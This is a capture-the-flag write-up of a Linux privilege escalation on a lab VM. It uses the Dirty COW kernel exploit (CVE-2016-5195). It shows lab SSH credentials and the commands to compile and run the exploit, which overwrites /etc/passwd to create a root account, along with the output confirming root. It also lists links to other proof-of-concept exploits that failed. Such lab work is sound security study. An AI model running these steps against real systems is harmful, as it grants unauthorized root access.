# Dirtycow

Starting with the knowledge gained during `writeup1.md`.

```sh
ip	: 192.168.1.7
user: zaz
pass: 646da671ca01bb5d84dbb5fb2238dc8e
```

We connect by ssh with the following credentials:

```sh
ssh zaz@192.168.1.7
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
zaz@192.168.1.7's password:
zaz@BornToSecHackMe:~$

```

We will use the file `dirty.c` which can be found in the `scripts/` directory

We got the source from here: https://github.com/FireFart/dirtycow/blob/master/dirty.c

We save it to a file named `dirty.c` in zaz home directory and compile it

```sh
zaz@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
```

We can now execute it with our choosen password:

```sh
zaz@BornToSecHackMe:~$ ./dirty prout
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: prout
Complete line:
firefart:fihHKdB5BBfTw:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'prout'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'prout'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

login to the new user created `firefart` and verifying our id:

```sh
zaz@BornToSecHackMe:~$ su firefart
Password:
firefart@BornToSecHackMe:/home/zaz# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@BornToSecHackMe:/home/zaz# exit
```

# Unsuccessfull attempts

Not working but tested, from : https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs

 1. dirtyc0w.c https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c

Tested on timezone which is with read rights for user, but write for root.
ls -l /etc/timezone && cat /etc/timezone && ./dirtyc0w /etc/timezone m00000000000000000 && cat /etc/timezone


 2. dirtycow-mem.c https://gist.github.com/scumjr/17d91f20f73157c722ba2aea702985d2

with LIBC_PATH = "/lib/i386-linux-gnu/libc.so.6"

tried this also, but no permission
https://github.com/dirtycow/dirtycow.github.io/issues/25#issuecomment-255852675


 3. cowroot.c https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679

 With the x86 (not default) shellcode

 4. dirtyc0w.go https://github.com/mengzhuo/dirty-cow-golang/blob/master/dirtyc0w.go

 No go interpreter

 5. dcow.cpp https://github.com/gbonacini/CVE-2016-5195

 No c++ bin, and gcc cant do it himself

 ```sh
 zaz@BornToSecHackMe:~/CVE-2016-5195$ make
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
make: g++: Command not found
make: *** [dcow] Error 127
zaz@BornToSecHackMe:~/CVE-2016-5195$ vim makefile
zaz@BornToSecHackMe:~/CVE-2016-5195$ make
gcc -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil -lstdc++
gcc: error trying to exec 'cc1plus': execvp: No such file or directory
make: *** [dcow] Error 1
zaz@BornToSecHackMe:~/CVE-2016-5195$ fg
-bash: fg: current: no such job
zaz@BornToSecHackMe:~/CVE-2016-5195$ vim makefile
zaz@BornToSecHackMe:~/CVE-2016-5195$ make
gcc -Wall -pedantic -O2 -pthread -o dcow dcow.cpp -lutil -lstdc++
gcc: error trying to exec 'cc1plus': execvp: No such file or directory
make: *** [dcow] Error 1
 ```

  6. cowpy.c https://github.com/nowsecure/dirtycow

  It's a r2pm plugin, cant install

  7. 0xdeadbeef.c https://github.com/scumjr/dirtycow-vdso

  missing nasm

  8. dirty_passwd_adjust_cow.c https://gist.github.com/ngaro/05e084ca638340723b309cd304be77b2

 consistent segfault
